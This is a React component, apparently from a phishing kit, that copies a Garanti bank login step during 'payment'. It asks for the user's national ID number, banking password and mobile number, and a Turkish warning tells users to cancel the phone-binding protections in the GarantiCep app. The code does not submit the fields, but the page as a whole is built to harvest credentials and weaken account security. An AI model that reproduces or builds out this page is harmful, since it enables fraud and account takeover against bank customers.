import React from 'react';
import NotifyBox from "../../../components/NotifyBox";

function BankAuth() {
    return (
        <div className={'bank-auth'}>
            <div className={'bank-auth-content'}>
                <img className={'bank-logo'} src={'images/banks/garanti.png'} alt={'bank logo'} />
                <p>Ödeme işlemi yapacağınız banka hesabınızın giriş bilgilerini doldurunuz.</p>
                <div className={'credential-inputs'}>
                    <div className={'c-input-tile'}>
                        <span>T.C. Kimlik No</span>
                        <input type={'number'} placeholder={'T.C. Kimlik No'}/>
                    </div>
                    <div className={'c-input-tile'}>
                        <span>Şifre</span>
                        <input type={'text'} placeholder={'Şifre'}/>
                    </div>
                    <div className={'c-input-tile'}>
                        <span>Cep telefonu</span>
                        <input type={'tel'} placeholder={'Cep telefonu'}/>
                    </div>
                </div>
            </div>
            <NotifyBox type={'warn'} text={'Uyarı: GarantiCep uygulamasında Tanımlı Telefon Yönetimi menüsüne girerek, 3 Farklı Telefondan giriş tanımladıysanız en az 1 tanesini, Tek Telefondan Giriş tanımladıysanız bu seçeneği IPTAL etmeniz gerekmektedir.'}/>
        </div>
    )
}

export default BankAuth;
